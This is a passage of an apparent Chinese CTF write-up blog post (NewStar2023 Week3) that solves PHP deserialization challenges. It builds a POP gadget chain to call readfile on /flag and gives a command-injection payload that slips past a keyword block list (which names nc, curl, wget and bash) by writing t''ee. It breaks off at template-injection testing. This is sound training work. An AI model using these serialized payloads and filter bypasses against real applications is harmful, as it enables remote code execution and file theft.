&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>&#x2F;&#x2F;目的是触发readfile(“&#x2F;flag”)函数</p>
+<p>&#x2F;&#x2F;需要触发WihteGod-&gt;__unset()方法 就必须通过unset(WihteGod()) </p>
+<p>&#x2F;&#x2F;需要unset(WihteGod()) 就必须通过CTF-&gt;end()</p>
+<p>&#x2F;&#x2F;需要CTF-&gt;end() 就必须通过Handle-&gt;__call()</p>
+<p>&#x2F;&#x2F;需要Handle-&gt;__call() 就必须通过Handle-&gt;<a href="">不存在的函数</a> 也就是Handle-&gt;getStr()   <strong>—call是魔术方法的一个，当程序调用到当前类中未声明或没权限调用的方法时，就会调用—call方法</strong></p>
+<p>&#x2F;&#x2F;需要Handle-&gt;getStr() 就必须通过Super-&gt;__invoke() </p>
+<p>&#x2F;&#x2F;需要Super-&gt;__invoke() 就必须通过(Super)()被当做函数调用<strong>—invoke()：当尝试以调用函数的方式调用一个对象时，—invoke() 方法会被自动调用。</strong></p>
+<p>&#x2F;&#x2F;需要(Super)() 就必须通过Then-&gt;__toString()</p>
+<p>&#x2F;&#x2F;需要Then-&gt;__toString() 就必须Then被当做字符串</p>
+<p>&#x2F;&#x2F;需要Then被当做字符串 就必须通过Begin-&gt;__destruct()</p>
+</blockquote>
+<p>由题目得知，我们最终是要想办法触发<code>WhiteGod-&gt;__unset()方法</code>，这样就能够通过构造**WhiteGod(func,cmd)**类，传入需要执行的函数和命令（例如<code>system(&quot;ls&quot;)</code>）。</p>
+<p>要触发<code>WhiteGod-&gt;__unset()方法</code>，就必须有一个<code>unset(WhiteGod-&gt;不存在)</code>，也就是**CTF(WhiteGod(func,cmd))**，并且要想办法触发<code>CTF-&gt;end()</code>。</p>
+<p>要触发<code>CTF-&gt;end()</code>方法，就只能通过<code>Handle(CTF)</code>，也就是**Handle(CTF(WhiteGod(func,cmd)))**。并且要想办法触发<code>Handle-&gt;__call()</code>。</p>
+<p>要触发<code>Handle-&gt;__call()</code>方法，就需要出现<code>Handle-&gt;不存在</code>，即<code>Handle-&gt;不存在getStr()</code>，也就是**Super(Handle(CTF(WhiteGod(func,cmd))))**，并且要想办法触发<code>Super-&gt;__invoke()</code>。</p>
+<p>要触发<code>Super-&gt;__invoke()方法</code>，就需要出现<code>(Super)();</code>即Super被当做函数名调用，也就是**Then(Super(Handle(CTF(WhiteGod(func,cmd)))))**，并且要想办法触发<code>Then-&gt;__toString()方法</code>。</p>
+<p>要触发<code>Then-&gt;__toString()方法</code>，就需要<code>Then被当做字符串处理</code>，即<code>Begin()-&gt;__destruct()</code>中的正则。也就是<strong>Begin(Then(Super(Handle(CTF(WhiteGod(func,cmd)))))</strong></p>
+<p>这样，完整的POP链就构造出来了</p>
+<hr>
+<p><strong>编写Exp</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Begin</span> <span class="keyword">as</span> <span class="title">GlobalBegin</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Then</span> <span class="keyword">as</span> <span class="title">GlobalThen</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span> = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>(<span class="keyword">new</span> <span class="title class_">Then</span>(<span class="keyword">new</span> <span class="title class_">Super</span>(<span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>(<span class="keyword">new</span> <span class="title class_">WhiteGod</span>(<span class="string">&quot;readfile&quot;</span>,<span class="string">&quot;/flag&quot;</span>))))) );</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025201417567.png" alt="image-20231025201417567"></p>
+<h4 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h4><p>题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>观察源码，典型的php序列化，观察题目，这又是一道rce的题目，应该可以通过tee命令-&gt;<strong>把执行的命令写入文件，我们可以访问这个文件来看到回显内容</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;ls / | t&#x27;&#x27;ee a&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>O%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BO%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BN%3B%7D%7D</code>注意将+ 换成%20</p>
+<p>接着访问<code>url/a</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027144154458.png" alt="image-20231027144154458"></p>
+<p>发现flag的藏身之地</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee b&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问url&#x2F;b 出现flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027144414800.png" alt="image-20231027144414800"></p>
+<h4 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h4><p>抓包发现：&#x2F;secr3tofpop</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145206974.png" alt="image-20231027145206974"></p>
+<p>打开发现 需要通过get给name传参</p>
+<p><img src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145301252.png" alt="image-20231027145301252"></p>
+<p>发现给name传什么，页面就回显什么，首先尝试了php伪协议读取文件，测试失败，在查询资料后发现与<code>UNCTF2020</code>的easyflask题目很相似，猜测是模版注入，首先尝试**{{%print(7*7)%}}**,发现应该是&#96;</p>
+
+  </div>
+  <div>    
+    <ul class="post-copyright">
+       <li class="post-copyright-link">
+        <strong>本文作者：</strong>
+        <a href="/">iahzl</a>
+      </li>
+      <li class="post-copyright-link">
+        <strong>本文标题：</strong>
+        <a href="{{ url_for(config.permalink) }}">
+    
+        <a class="" href="/NewStar2023-WriteUp-Week3/">NewStar2023 Week3</a>
+    
+
+
+</a>
+      </li>
+      <li class="post-copyright-link">
+        <strong>本文链接：</strong>
+        <a title="NewStar2023 Week3">https://iahzl.github.io/NewStar2023-WriteUp-Week3/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明： </strong>
+        本文由 iahzl 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" title="Attribution-NonCommercial-NoDerivatives 4.0 International" rel="license" target="_blank">CC BY-NC-ND 4.0</a>, 转载请保留以上声明信息！
+      </li>
+    </ul>
+</div>
+</article>
+<script>
+  function setClipboardText(event){
+      // clipboardData 对象是为通过编辑菜单、快捷菜单和快捷键执行的编辑操作所保留的，也就是你复制或者剪切内容
+      let clipboardData = event.clipboardData || window.clipboardData;
+      // 如果未复制或者未剪切，则return出去
+      if (!clipboardData) { return; }
+      event.preventDefault();
+      // Selection 对象，表示用户选择的文本范围或光标的当前位置。
+      //     声明一个变量接收 -- 用户输入的剪切或者复制的文本转化为字符串
+      let text = window.getSelection().toString();
+  
+      if (text) {
+          // 如果文本存在则先取消文本默认事件
+          event.preventDefault();
+          // 通过调用常clipboardData对象的 setData(format, data) 方法；来设置相关文本
+          // format: 一个DOMString 表示要添加到 drag object的拖动数据的类型。
+          // data: 一个 DOMString表示要添加到 drag object的数据。
+          var copyright = '\n\n'
+          + '——————————————————————'
+          + '\n版权声明：本文为「Ywj226」的原创文章，遵循CC BY-NC-ND 4.0版权协议，转载请附上原文出处链接及本声明。'
+          + '\n原文链接：https://iahzl.github.io/NewStar2023-WriteUp-Week3/'
+  
+          clipboardData.setData('text/plain', text + copyright);
+  
+      }
+  };
+  var contents = document.getElementsByClassName("content");
+  // 监听文章内容的copy事件
+  contents[0].addEventListener('copy',function(e){
+      setClipboardText(e);
+  });
+</script>
+
+
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+    <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+        var gitalk = new Gitalk({
+            clientID: 'a4d73b206590627d55c0',
+            clientSecret: '68744004f2191865ab4a5e6ee2eba67c673c6795',
+            id: md5(window.location.pathname),
+            repo: 'iahzl.github.io',
+            owner: 'iahzl',
+            admin: 'iahzl',
+            distractionFreeMode: ''
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#week3"><span class="toc-number">1.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Include-%F0%9F%8D%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">Include 🍐</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#medium-sql"><span class="toc-number">1.1.2.</span> <span class="toc-text">medium_sql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POP-Gadget"><span class="toc-number">1.1.3.</span> <span class="toc-text">POP Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#R-C-E"><span class="toc-number">1.1.4.</span> <span class="toc-text">R!!!C!!!E!!!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GenShin"><span class="toc-number">1.1.5.</span> <span class="toc-text">GenShin</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/NewStar2023-WriteUp-Week3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&text=NewStar2023 Week3"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&title=NewStar2023 Week3"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&is_video=false&description=NewStar2023 Week3"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NewStar2023 Week3&body=Check out this article: https://iahzl.github.io/NewStar2023-WriteUp-Week3/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&title=NewStar2023 Week3"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&title=NewStar2023 Week3"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&title=NewStar2023 Week3"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&title=NewStar2023 Week3"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&name=NewStar2023 Week3&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&t=NewStar2023 Week3"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    iahzl
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/categories/">Categories</a></li><!--
+    --><!--
+      --><li><a href="/tags/">Tags</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?10298bb37106529e820abfbd855cea34";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
